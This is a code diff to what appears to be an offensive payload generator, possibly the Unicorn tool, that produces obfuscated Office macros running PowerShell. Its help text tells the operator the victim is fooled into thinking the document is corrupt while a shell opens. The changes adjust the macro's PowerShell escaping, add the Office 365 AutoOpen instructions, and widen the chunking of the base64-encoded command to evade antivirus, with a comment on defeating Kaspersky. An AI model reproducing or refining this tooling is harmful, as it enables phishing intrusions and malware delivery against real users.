@@ -25,6 +25,17 @@ import shutil
 import random
 import string
 
+#######################################################################################################
+# Keep Matt Happy #####################################################################################
+#######################################################################################################
+# ____  __.                        _____          __    __      ___ _                                ##
+#|    |/ _|____   ____ ______     /     \ _____ _/  |__/  |_   /   |   \_____  ______ ______ ___.__. ##
+#|      <_/ __ \_/ __ \\____ \   /  \ /  \\__  \\   __\   __\ /    ~    \__  \ \____ \\____ <   |  | ##
+#|    |  \  ___/\  ___/|  |_> > /    Y    \/ __ \|  |  |  |   \    Y    // __ \|  |_> >  |_> >___  | ##
+#|____|__ \___  >\___  >   __/  \____|__  (____  /__|  |__|    \___|_  /(____  /   __/|   __// ____| ##
+#        \/   \/     \/|__|             \/     \/                    \/      \/|__|   |__|   \/      ##
+#######################################################################################################
+#######################################################################################################
 #
 # generate a random string
 #
@@ -83,6 +94,10 @@ def gen_unicorn():
                          |  \         \ \              I  `
                          ( __;        ( _;            ('-_';
                          |___\        \___:            \___:
+
+
+aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=
+
                 """)
 
 
@@ -100,12 +115,12 @@ is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! 
 victim to thinking the excel document is corrupted. You should get a shell through powershell injection
 after that.
 
-If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of 
+""" +  ColorsEnum.RED + """If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of 
 the output from: Sub Auto_Open()
  
 To: Sub AutoOpen()
  
-The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.
+The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.""" + ColorsEnum.ENDC + """
 
 NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
 REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
@@ -293,8 +308,10 @@ def generate_macro(full_attack, line_length=380):
     # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
     macro_str = macro_str.replace(
-        'powershell -w 1 -C "', r'powershell -w 1 -nop -C \""')
-    macro_str = macro_str.replace(''''"''', r''''\""''')
+        #'powershell -w 1 -C "', r'powershell -w 1 -nop -C \""')
+        'powershell -w 1 -C "', r'-w 1 -C ""')
+    #macro_str = macro_str.replace(''''"''', r''''\""''')
+    macro_str = macro_str.replace("')", "')\"\"")
 
     # obfsucate the hell out of Shell and PowerShell
     long_string = scramble_stuff().split(",")
@@ -500,7 +517,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     # honestly anti-virus is one of the most annoying programs ever created - it has nothing to do with security, but if something becomes popular, lets write a signature that annoys the author. So in this example, we say F A/V because it's literally terrible. What AV - i.e. Kaspersky in this case was doing was evaluating the base64 encoded command - so what do we do? Chunk it up because anti-virus is absolutely ridiculous. Of course this gets around it because it doesn't know how to interpret PowerShell. Instead, what you need to be looking for is long powershell statements, toString() as suspicious, etc. That'll never happen because A/V is suppose to be signature based on something they can catch. You all literally are a dying breed. Sorry for the rant, but it's annoying to have to sit here and rewrite stupid stuff because your wrote a shitty sig. -Dave
     fuckav = base64.b64encode(powershell_code.encode('utf_16_le'))
     # here we mangle our encodedcommand by splitting it up in random chunks
-    avsux = randomint = random.randint(100,140)
+    avsux = randomint = random.randint(300,340)
     avnotftw = [fuckav[i: i + avsux] for i in range(0, len(fuckav), avsux)]
     haha_av = ""
     counter = 0
